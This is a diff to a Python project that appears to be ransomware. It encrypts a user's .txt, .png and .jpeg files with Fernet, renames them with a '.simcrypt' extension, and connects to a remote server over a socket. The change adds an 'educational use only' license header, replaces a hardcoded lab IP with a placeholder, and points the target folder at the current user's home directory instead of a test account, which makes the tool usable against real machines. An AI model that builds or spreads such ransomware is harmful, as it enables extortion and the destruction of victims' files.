@@ -1,3 +1,9 @@
+# MIT License
+# Copyright (c) 2025 Warren Coleman
+# 
+# This software is provided for educational and research purposes only.
+# Unauthorized use of this tool for malicious purposes is illegal.
+
 import socket
 import os
 import json
@@ -76,7 +82,7 @@ class Decoder:
         try:
             f = Fernet(key)
             with open(file_path, 'rb') as file:
-                encrypted_data = file.read() 
+                encrypted_data = file.read()
             decrypted_data = f.decrypt(encrypted_data)
            
             original_file_path = file_path.replace(".simcrypt", "")
@@ -107,10 +113,10 @@ class Decoder:
         gc.collect()
 
 def main():
-    host = '192.168.42.130'
+    host = '0.0.0.0' #Change to the server's IP
     extensions = ['.txt', '.png', '.jpeg']
-    port = 9672
-    directory = 'c:/Users/gullible'
+    port = 9672 #Change to the port the server is listening on
+    directory = 'c:/Users/' + Encoder.get_username()
 
     test_encode = Encoder(host, port, directory, extensions)
     test_encode.find_files()
